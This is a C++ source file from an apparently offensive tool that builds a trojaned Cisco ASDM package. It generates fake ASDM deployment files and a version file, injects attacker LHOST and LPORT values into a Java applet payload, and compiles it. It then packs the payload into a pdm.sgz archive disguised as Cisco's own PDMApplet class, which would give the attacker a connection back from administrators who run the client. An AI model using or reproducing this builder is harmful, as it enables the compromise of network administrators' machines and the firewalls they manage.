#include "extract.hpp"
#include "repackage.hpp"
#include "util.hpp"

#include <random>
#include <arpa/inet.h>
#include <cstdlib>
#include <iostream>
#include <unistd.h>
#include <map>
#include <set>
#include <filesystem>
#include <cstring>
#include <fstream>

namespace theway
{
    std::map<std::string, std::string> file_map =
    {
      { "asdm50-install.msi", "test" },
      { "asdmversion.html", "test" },
      { "dm-launcher.dmg", "test" },
      { "dm-launcher.msi", "test" },
      { "pdm.sgz", "test" },
      { "pdmversion.html", "test" },
      { "public%asa-pix.gif", "test" },
      { "public%asdm.jnlp", "test" },
      { "public%asdm32.gif", "test" },
      { "public%cert.jnlp", "test" },
      { "public%cisco.gif", "test" },
      { "public%deployJava.js", "test" },
      { "public%dm-launcher.jar", "test" },
      { "public%index.html", "test" },
      { "public%jploader.jar", "test" },
      { "public%lzma.jar", "test" },
      { "public%retroweaver-rt-2.0.jar", "test" },
      { "public%startup.jnlp", "test" },
      { "version.prop", "#version file\n#Wed Nov 24 00:12:33 PST 2021\nasdm.version=7.17(1)\nlauncher.size=880128\nlauncher.version=1.9.0\n" }
    };

    void write_file(const std::string& p_output, const std::string& p_file)
    {
        std::ofstream out(p_file, std::ios::trunc);
        out.write(p_output.data(), p_output.size());
        out.close();      
    }

    void create_jar_entry(std::string& p_jars, const std::string& p_name, const std::string& p_data)
    {
        std::uint16_t name_length = p_name.size();
        std::uint32_t data_length = p_data.size();
        p_jars.append(reinterpret_cast<const char*>(&name_length), sizeof(name_length));
        p_jars.append(p_name);
        p_jars.append(reinterpret_cast<const char*>(&data_length), sizeof(data_length));
        p_jars.append(p_data.data(), p_data.size());
    }

    void findAndReplace(std::string& p_haystack, const std::string& p_needle, const std::string& p_replacement)
    {
        std::size_t pos = p_haystack.find(p_needle);
        if (pos != std::string::npos)
        {
            p_haystack.replace(pos, p_needle.size(), p_replacement);
        }
    }

    bool do_generate(const std::string& p_ip, std::uint32_t p_port)
    {
        //dump the files to ./output/
        system("rm -rf ./output; mkdir ./output");
        for (auto it = file_map.begin(); it != file_map.end(); ++it)
        {
            std::fstream entry_file;
            entry_file.open("./output/" + it->first, std::ios::out | std::ios::binary);
            entry_file.write(it->second.data(), it->second.size());
            entry_file.close();
        }

        std::filesystem::copy_file("../payload/PDMApplet_jjs.java", "PDMApplet.java", std::filesystem::copy_options::overwrite_existing);
        std::filesystem::copy_file("../payload/SgzApplet.java", "SgzApplet.java", std::filesystem::copy_options::overwrite_existing);

        std::string pdm(load_file("PDMApplet.java"));
        if (pdm.empty())
        {
            std::cerr << "[-] Failed to load PDMApplet.java" << std::endl;
            return false;
        }

        std::string port(std::to_string(p_port));
        findAndReplace(pdm, "!!!LHOST!!!", p_ip);
        findAndReplace(pdm, "!!!LPORT!!!", port);
        write_file(pdm, "PDMApplet.java");

        std::cout << "[+] Compiling Payload using `javac PDMApplet.java SgzApplet.java`" << std::endl;
        system("javac PDMApplet.java SgzApplet.java");

        std::cout << "[+] Creating JAR entries" << std::endl;
        std::string jars;
        std::string payload(load_file("PDMApplet.class"));
        if (payload.empty())
        {
            std::cerr << "Failed to load PDMApplet.class. Did compilation fail?" << std::endl;
            return EXIT_FAILURE;
        }
        create_jar_entry(jars, "com/cisco/pdm/PDMApplet.class", payload);
        write_file(jars, "jars");

        std::cout << "[+] Compressing jar entries with `lzma -z jars`" << std::endl;
        system("rm jars.lzma 2>/dev/null; lzma -z jars");

        std::cout << "[+] Adding sgz wrapper" << std::endl;
        std::string compressed_jars(load_file("jars.lzma"));
        if (compressed_jars.empty())
        {
            std::cerr << "Failed to load jars.lzma. Did lzma -z fail?" << std::endl;
            return EXIT_FAILURE;
        }

        // create fingerprint header
        std::random_device randomish;
        std::uint8_t fingerprint[17] = { 0 };
        for (int i = 0; i < 16; i++)
        {
            fingerprint[i] = randomish();
        }
        fingerprint[16] = 0x67;

        // create header for jars
        std::uint8_t jar_header[5] = { 0 };
        jar_header[4] = 3;
        std::uint32_t jar_length = compressed_jars.size();
        memcpy(jar_header, &jar_length, sizeof(uint32_t));

        // create last entry header
        std::uint8_t trailer[5] = { 0xff, 0xff, 0xff, 0xff, 0x00 };

        std::cout << "[+] Flushing the pdm.sgz to disk" << std::endl;
        std::ofstream out("pdm.sgz");
        out.write((const char*)&fingerprint[0], 17);
        out.write((const char*)&jar_header[0], 5);
        out.write(compressed_jars.data(), compressed_jars.size());
        out.write((const char*)&trailer[0], 5);
        out.close();

        // i've become everything i hate
        system("mv pdm.sgz ./output/; rm jars.lzma PDMApplet.* SgzApplet.*");
        
        // invoke normal repackage logic
        return do_repackage("./output/");
    }
}